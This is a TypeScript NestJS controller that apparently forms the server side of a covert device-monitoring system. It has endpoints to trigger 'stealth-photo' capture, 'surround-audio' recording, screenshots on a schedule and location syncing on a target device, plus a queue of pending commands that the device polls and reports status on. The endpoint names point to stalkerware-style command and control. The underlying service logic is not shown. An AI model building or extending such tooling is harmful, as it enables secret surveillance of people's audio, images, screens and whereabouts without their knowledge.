import { Controller, Get, Post, Body, Query, Param } from '@nestjs/common';
import { 
  CommandsService, 
  SurroundAudioCommandDto, 
  StealthPhotoCommandDto, 
  ScreenshotCommandDto, 
  SyncLocationCommandDto 
} from './commands.service';

@Controller('commands')
export class CommandsController {
  constructor(private readonly commandsService: CommandsService) {}

  @Post('surround-audio')
  async triggerSurroundAudio(@Body() dto: SurroundAudioCommandDto) {
    return this.commandsService.triggerSurroundAudio(dto);
  }

  @Post('stealth-photo')
  async triggerStealthPhoto(@Body() dto: StealthPhotoCommandDto) {
    return this.commandsService.triggerStealthPhoto(dto);
  }

  @Post('screenshot')
  async triggerScreenshot(@Body() dto: ScreenshotCommandDto) {
    return this.commandsService.triggerScreenshot(dto);
  }

  @Post('sync-location')
  async triggerLocationSync(@Body() dto: SyncLocationCommandDto) {
    return this.commandsService.triggerLocationSync(dto);
  }

  @Post('screenshot/schedule')
  async setScreenshotSchedule(@Body() body: { deviceId: string; active: boolean; durationMin?: number; intervalSec?: number; startDelayMin?: number; startTime?: number }) {
    return this.commandsService.setScreenshotSchedule(body);
  }

  @Get('screenshot/schedule/:deviceId')
  async getScreenshotSchedule(@Param('deviceId') deviceId: string) {
    return this.commandsService.getScreenshotSchedule(deviceId);
  }

  @Get('pending/:deviceId')
  async getPendingCommands(@Param('deviceId') deviceId: string) {
    return this.commandsService.getPendingCommands(deviceId);
  }

  @Post('status')
  async updateCommandStatus(@Body() body: { deviceId: string; commandId: string; status: 'PENDING' | 'SUCCESS' | 'FAILED'; error?: string }) {
    return this.commandsService.updateCommandStatus(body);
  }

  @Get('status/:deviceId')
  async getCommandStatuses(@Param('deviceId') deviceId: string) {
    return this.commandsService.getCommandStatuses(deviceId);
  }
}
